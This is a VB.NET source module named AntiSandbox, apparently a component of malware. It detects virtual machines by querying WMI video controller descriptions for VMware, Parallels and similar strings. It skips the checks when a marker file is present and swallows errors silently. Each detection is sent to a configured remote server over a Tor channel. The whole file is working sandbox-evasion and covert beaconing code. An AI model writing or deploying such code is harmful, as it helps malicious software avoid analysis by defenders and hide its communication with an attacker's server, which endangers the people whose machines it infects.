Imports System.Management
Imports System.Security.Principal
Imports Microsoft.Win32

Module AntiSandbox
    Public AntisDetected As Boolean = False
    Public Function IsAdmin() As Boolean
        Try
            Dim id As WindowsIdentity = WindowsIdentity.GetCurrent()

            Dim p As WindowsPrincipal = New WindowsPrincipal(id)

            Return p.IsInRole(WindowsBuiltInRole.Administrator)

        Catch
            Return False
        End Try

    End Function
    Public Sub RunAntis()
        On Error Resume Next

        If Not IO.File.Exists(IO.Path.GetTempPath & "microsoft.ini") Then
            SearchVM()
        End If

    End Sub
    Public Sub SearchVM()
        Try
            Dim searcher As New ManagementObjectSearcher("root\CIMV2", "SELECT * FROM Win32_VideoController")
            Dim str As String = String.Empty
            Dim obj2 As ManagementObject
            Dim http As New SendHTTPonTor
            For Each obj2 In searcher.Get
                str = Convert.ToString(obj2.Item("Description"))
                Dim Search As String = StrConv(str, VbStrConv.Lowercase)
                If Search.Contains("virtual") Then
                    Dim log As New LogModel With {
                            .KeyUnique = GetConfigJson.KeyUnique,
                            .Message = "Finded Virtual mashine: Virtual",
                            .Type = "Info"
                        }
                    http.TalkChannelHTTP(log, Config.UrlVariables.LogUrl, Config.Variables.Address, Config.Variables.ServerReachPort)
                    If Config.Variables.Debug Then
                        Console.WriteLine("Finded Virtual mashine: Virtual")
                    End If
                End If
                If Search.Contains("vmware") Then
                    Dim log As New LogModel With {
                            .KeyUnique = GetConfigJson.KeyUnique,
                            .Message = "Finded Virtual mashine: VMware",
                            .Type = "Info"
                        }
                    http.TalkChannelHTTP(log, Config.UrlVariables.LogUrl, Config.Variables.Address, Config.Variables.ServerReachPort)
                    If Config.Variables.Debug Then
                        Console.WriteLine("Finded Virtual mashine: VMware")
                    End If
                End If
                If Search.Contains("parallels") Then
                    Dim log As New LogModel With {
                            .KeyUnique = GetConfigJson.KeyUnique,
                            .Message = "Finded Virtual mashine: Parallels",
                            .Type = "Info"
                        }
                    http.TalkChannelHTTP(log, Config.UrlVariables.LogUrl, Config.Variables.Address, Config.Variables.ServerReachPort)
                    If Config.Variables.Debug Then
                        Console.WriteLine("Finded Virtual mashine: Parallels")
                    End If
                End If
                If Search.Contains("vm additions") Then
                    Dim log As New LogModel With {
                            .KeyUnique = GetConfigJson.KeyUnique,
                            .Message = "Finded Virtual mashine: VM Additions",
                            .Type = "Info"
                        }
                    http.TalkChannelHTTP(log, Config.UrlVariables.LogUrl, Config.Variables.Address, Config.Variables.ServerReachPort)
                    If Config.Variables.Debug Then
                        Console.WriteLine("Finded Virtual mashine: VM Additions")
                    End If
                End If
            Next
        Catch : End Try
    End Sub
End Module
